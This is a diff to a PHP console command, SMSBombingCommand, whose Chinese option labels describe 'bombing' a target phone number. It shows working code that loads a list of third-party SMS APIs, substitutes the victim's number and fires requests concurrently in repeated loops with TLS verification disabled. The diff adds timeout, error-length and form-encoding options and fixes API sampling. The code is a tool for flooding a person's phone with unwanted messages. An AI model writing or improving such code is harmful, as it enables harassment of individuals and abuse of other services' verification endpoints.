@@ -30,7 +30,9 @@ class SMSBombingCommand extends SingleCommandApplication
             ->addArgument('phone', InputArgument::REQUIRED, '轰炸手机号')
             ->addOption('num', 'num', InputOption::VALUE_OPTIONAL, '轰炸次数', 10)
             ->addOption('loop', 'l', InputOption::VALUE_OPTIONAL, '启动循环轰炸次数,', 0)
-            ->addOption('intervals', 'i', InputOption::VALUE_OPTIONAL, '循环轰炸间隔时间', 0);
+            ->addOption('intervals', 'i', InputOption::VALUE_OPTIONAL, '循环轰炸间隔时间', 0)
+            ->addOption('timeout', 't', InputOption::VALUE_OPTIONAL, '请求超时时间', 30)
+            ->addOption('length', 'length', InputOption::VALUE_OPTIONAL, '报错展示长度', 64);
     }
 
     /**
@@ -43,23 +45,25 @@ class SMSBombingCommand extends SingleCommandApplication
         $i = 1;
         $status = true;
         $apis = $this->fetchApi();
+        $num = $input->getOption('num');
         $loop = $input->getOption('loop');
         $phone = $input->getArgument('phone');
 
         do {
-            $apis = $input->getOption('num') == 'all' ? $apis->toArray() : $apis->random($input->getOption('num'));
+            $apis = $num == 'all' ? $apis->toArray() : ($num > $apis->count() ? $apis->toArray() : $apis->random($num)->toArray());
             $requests = function () use ($apis, $phone) {
                 foreach ($apis as $api) {
                     $url = str_replace('[phone]', $phone, $api['url']);
                     $body = is_array($api['data']) ? array_map(fn ($item): string|array => str_replace('[phone]', $phone, $item), $api['data']) : [];
 
-                    yield new Request($api['method'], $url, is_array($api['header']) ? $api['header'] : [], json_encode($body, JSON_UNESCAPED_UNICODE));
+                    $body = isset($api['form']) ? http_build_query($body) : json_encode($body, JSON_UNESCAPED_UNICODE);
+                    yield new Request($api['method'], $url, is_array($api['header']) ? $api['header'] : [], $body);
                 }
             };
 
-            $fn = fn ($body) => mb_strlen($body) > 128 ? mb_substr($body, 0, 64) : $body;
+            $fn = fn ($body) => mb_strlen($body) > 128 ? mb_substr($body, 0, $input->getOption('length')) : $body;
 
-            $pool = new Pool(new Client(['verify' => false]), $requests(), [
+            $pool = new Pool(new Client(['verify' => false, 'timeout' => $input->getOption('timeout')]), $requests(), [
                 'concurrency' => 5,
                 'fulfilled' => function (Response $response, $index) use ($output, $fn): void {
                     $body = $fn($response->getBody());
